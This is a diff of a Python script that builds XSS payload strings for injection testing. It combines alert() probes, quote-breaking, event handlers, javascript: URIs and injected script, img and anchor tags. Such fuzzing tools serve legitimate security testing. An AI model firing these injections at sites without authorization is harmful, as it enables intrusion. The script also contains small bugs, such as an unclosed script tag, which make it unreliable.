@@ -1,62 +1,77 @@
-base_payload_list = ["alert()","alert;throw 1"]
+image_filepath = "/image/favicon.ico" #change this
+
+base_payload_list = ["alert()","alert;throw 1","alert`1`"]
 quotation_list = ["","\"","'","`"]
-bracket_c_list = ["",">"]
 bracket_o_list = ["<a href="]
 
-script_runner_list = [
-  "{base_payload}",
-  "javascript:{base_payload}",
-  "{quote} {event_tag}={quote}{base_payload}",
-  "{quote}{bracket_c}<script>{base_payload}</script>{bracket_o}{quote}",
-  "{quote}{bracket_c}<img src=1 {event_tag}={base_payload}>{bracket_o}{quote}",
-  "{quote}{bracket_c}<img src=\"javascript:{base_payload}\">{bracket_o}{quote}",
-  "{quote}{bracket_c}<a href=\"javascript:{base_payload}\">{bracket_o}{quote}"
+context_list = [
+  "{base_payload}", # already in japascript
+  "javascript:{base_payload}", # javascriptscheme
+  "1{quote} {event_handler}={quote}{base_payload}", # execute in an element with event handler
+  "1{quote}>{new_element}{bracket_o}{quote}1", # create a new element.
 ]
 
-event_tag_list = [
+event_handler_list = [
   "onload",
   "onerror",
   "autofocus onfocus"
 ]
 
+new_element_list = [
+  "<script>{base_payload}<script>",
+  "<{tag} {event_handler2}={base_payload}>"
+]
+
+tag_list = [
+  "img src=doesNotExist.NaN",
+  "img src="+image_filepath,
+  "a href=\"http://doesNotExist.NaN\""
+]
+
 plain_payload_list = []
 
 class payload_parameters:
+  context = ""
   base_payload=""
+  event_handler = ""
   quate=""
-  event_tag=""
-  script_runner=""
+  new_element=""
+  tag=""
+  event_handler2 = ""
   bracket_o=""
-  bracket_c=""
-  
+
 def build_plain_payloads():
   pay_par = payload_parameters()
-  for script_runner in script_runner_list:
-    pay_par.script_runner = script_runner
+  for context in context_list:
+    pay_par.context = context
     for base_payload in base_payload_list:
       pay_par.base_payload = base_payload
-      for event_tag in event_tag_list:
-        pay_par.event_tag = event_tag
+      for event_handler in event_handler_list:
+        pay_par.event_handler = event_handler
         for quote in quotation_list:
           pay_par.quote = quote
-          for bracket_c in bracket_c_list:
-            pay_par.bracket_c = bracket_c
-            if bracket_c=="":
-              pay_par.bracket_o = ""
-              build_plain_payload_for_param(pay_par)
-            else:
-              for bracket_o in bracket_o_list:
-                pay_par.bracket_o = bracket_o
-                build_plain_payload_for_param(pay_par)
-              
+          for new_element in new_element_list:
+            pay_par.new_element = new_element
+            for tag in tag_list:
+              pay_par.tag = tag
+              for event_handler2 in event_handler_list:
+                pay_par.event_handler2 = event_handler2
+                for bracket_o in bracket_o_list:
+                  pay_par.bracket_o = bracket_o
+                  build_plain_payload_for_param(pay_par)
+
 def build_plain_payload_for_param(pay_par):
   global plain_payload_list
   plain_payload_list.append(
-    pay_par.script_runner.format(
+    pay_par.context.format(
       base_payload=pay_par.base_payload,
-      event_tag=pay_par.event_tag,
       quote=pay_par.quote,
-      bracket_c=pay_par.bracket_c,
+      event_handler=pay_par.event_handler,
+      new_element=pay_par.new_element.format(
+        base_payload=pay_par.base_payload,
+        tag=pay_par.tag,
+        event_handler2=pay_par.event_handler2
+      ),
       bracket_o=pay_par.bracket_o
     )
   )
